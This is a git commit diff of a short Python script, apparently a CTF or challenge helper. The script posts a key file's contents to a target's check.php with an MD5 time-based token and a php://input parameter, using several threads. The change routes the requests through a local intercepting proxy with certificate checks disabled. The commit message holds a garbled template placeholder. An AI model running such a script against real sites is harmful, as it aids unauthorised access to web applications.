0d92ae5a6fb677ab35f04c38ab89a24da7ec74f5
whb54012 <1226844928@qq.com>
2026-08-15 07:33:01 +0000

    自动提交：更新 ${2026/8/15 15:33ilenPM33e}

--- python/红包6脚本.py
+++ python/红包6脚本.py
@@ -1,11 +1,15 @@
 import requests,threading,hashlib
+proxy = {
+    "http":"http://127.0.0.1:8080",
+    "https":"http://127.0.0.1:8080"
+}
 minute=hashlib.md5(input("输入时分").encode()).hexdigest()
 url=input("输入网址")+"/check.php?token="+minute+"&php://input"
 with open("C:\\Users\\whb\\Downloads\\key (1).dat","rb")as f:
     data1=f.read()
     data2=b"mmmmmmm"
 def func(data):
-    reponse=requests.post(url=url,data=data,verify=False)
+    reponse=requests.post(url=url,data=data,proxies=proxy,verify=False)
     with lock:
         print(reponse.text+"\n")
 thred=[]
